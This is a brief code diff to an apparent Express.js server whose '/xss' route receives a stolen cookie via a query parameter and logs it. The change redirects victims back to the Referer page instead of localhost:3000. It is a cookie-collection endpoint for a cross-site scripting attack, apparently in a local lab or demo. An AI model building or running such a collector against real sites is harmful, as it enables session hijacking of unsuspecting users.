@@ -6,7 +6,7 @@ const port = 4000;
 app.get('/xss', (req, res) => {
     const cookieValue = req.query.cookie; 
     console.log('Received cookie:', cookieValue); 
-    res.redirect('http://localhost:3000/');
+    res.redirect(req.headers.referer!.toString());
 })
 
 app.get("/", (req, res) => {
